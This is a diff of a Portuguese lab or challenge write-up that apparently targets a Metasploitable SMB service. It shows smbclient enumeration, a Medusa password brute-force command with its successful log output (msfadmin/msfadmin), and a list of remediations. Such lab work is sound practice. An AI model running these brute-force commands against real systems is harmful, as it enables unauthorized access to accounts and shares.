@@ -146,5 +146,30 @@ input
 smbclient -L //192.168.0.155 -U msfadmin
 ```
 
-então crio o arquivo [user.txt](/user.txt) com os usuários do 
+então crio o arquivo [user.txt](/user.txt) com os usuários do [enum4_out.txt](/enum4_out.txt), apenas separando os nomes para poder usar eles no ataque simulado
 
+- usando Medusa para encontrar um usuário com uma WordList pequena de senhas (anteriormente criada)
+
+input
+```bash
+medusa -h 192.168.0.155 -U user.txt -P pass.txt -M smbnt -t 2 -T 50
+```
+
+observado dentre várias tentativas:
+```text
+2026-11-19 22:46:10 ACCOUNT FOUND: [smbnt] Host: 192.168.0.155 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+```
+
+permitindo assim acesso ao sistema e abertura para diversas formas de ataques
+
+### Remediação
+- Desabilitar sessões nulas (null session) — impede enumeração anônima de usuários, grupos e shares sem autenticação. É a falha mais crítica identificada.
+- Atualizar a versão do Samba — a versão encontrada (3.0.20) é antiga e vulnerável a múltiplas falhas conhecidas de execução remota de código.
+- Restringir o acesso aos compartilhamentos (shares) — remover acesso anônimo/guest e limitar a listagem e leitura apenas a usuários autenticados e autorizados.
+- Fortalecer a política de senhas — aumentar o tamanho mínimo exigido e habilitar requisitos de complexidade (atualmente desabilitados).
+Desabilitar protocolos obsoletos (SMB1) — forçar o uso de versões mais recentes do protocolo (SMB2/SMB3), já que SMB1 é vulnerável a exploits conhecidos.
+- Segmentar a rede / aplicar firewall — restringir o acesso às portas do SMB (139/445) apenas às máquinas que realmente precisam, nunca expondo à internet.
+- Habilitar logging e auditoria — registrar tentativas de conexão e enumeração para detectar atividades suspeitas.
+- Desabilitar serviços legados desnecessários — como telnetd, que transmite credenciais em texto claro, reduzindo a superfície de ataque geral do sistema.
+
+- Fim do Desafio
